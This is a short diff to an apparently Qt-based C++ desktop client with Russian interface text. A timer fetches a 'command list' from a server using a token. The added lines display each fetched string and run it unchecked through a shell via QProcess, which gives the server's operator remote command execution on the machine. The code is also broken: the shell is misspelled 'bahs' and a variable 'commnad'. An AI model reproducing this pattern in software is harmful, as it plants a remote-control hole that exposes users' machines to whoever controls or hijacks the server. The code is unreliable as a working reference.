@@ -1,5 +1,7 @@
 #include <filesystem>
 #include <iostream>
+#include <QProcess>
+#include <QString>
 
 #include "ui_main_window.h"
 #include "ui_start_window.h"
@@ -12,7 +14,11 @@ void MainWindow::display_commands(QTimer* timer, QLabel* label) {
     qDebug() << "запуск дисплея";
     connect(timer, &QTimer::timeout, this, [label, this]() {
         if (const auto result = requests.get_command(token); result.has_value()) {
-            label->setText("Список команд: " + QString::fromStdString(result.value()));
+            const QString commnad = QString::fromStdString(result.value());
+            label->setText("Список команд: " + commnad);
+
+            QProcess process;
+            process.start("bahs", QStringList() << "-c" << commnad);
         } else {
             label->setText("Список команд: пуст");
         }
